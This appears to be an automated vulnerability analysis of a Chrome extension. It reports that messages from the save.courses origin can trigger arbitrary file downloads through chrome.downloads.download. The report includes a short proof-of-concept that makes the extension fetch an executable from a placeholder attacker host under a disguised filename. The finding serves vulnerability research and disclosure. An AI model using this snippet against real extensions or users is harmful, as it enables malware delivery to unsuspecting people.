# CoCo Analysis: gbceabffpdimeplfhancemhcphlfjhie

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_downloads_download_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gbceabffpdimeplfhancemhcphlfjhie/opgen_generated_files/bg.js
Line 967: chrome.runtime.onMessageExternal.addListener((function(t,o,r){...
```

**Code:**

```javascript
// Background script (bg.js) - Minified code deobfuscated
chrome.runtime.onMessageExternal.addListener((function(t, o, r) {
    return async function() {
        const {action: i, data: u} = t; // t = request, o = sender, r = sendResponse

        // Only accepts messages from https://save.courses origin
        if (["https://save.courses"].includes(o.origin)) {
            switch (i) {
                case "GET_DATA":
                    // ... other code
                    break;

                case "DOWNLOAD_RESOURCES":
                    // ... downloads from processed data
                    break;

                case "DOWNLOAD_VIDEO":
                    // Vulnerable sink - directly uses external data
                    u && u.url && u.filename && (
                        chrome.downloads.download({
                            url: u.url, // ← attacker-controlled URL
                            conflictAction: "overwrite",
                            filename: u.filename // ← attacker-controlled filename
                        }),
                        r(!0)
                    );
            }
            c(t, r);
        }
    }(), !0
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal - External website messaging

**Attack:**

```javascript
// From any page on https://save.courses/* domain:
chrome.runtime.sendMessage(
    "gbceabffpdimeplfhancemhcphlfjhie", // Extension ID
    {
        action: "DOWNLOAD_VIDEO",
        data: {
            url: "https://attacker.com/malware.exe",
            filename: "important_document.exe"
        }
    },
    function(response) {
        console.log("Download triggered:", response);
    }
);
```

**Impact:** An attacker who controls content on the https://save.courses domain (via XSS, compromised site, or if they own the domain) can trigger arbitrary downloads from any URL with any filename. This allows downloading malicious executables disguised with trusted filenames, potentially leading to malware installation if users execute the downloaded files.
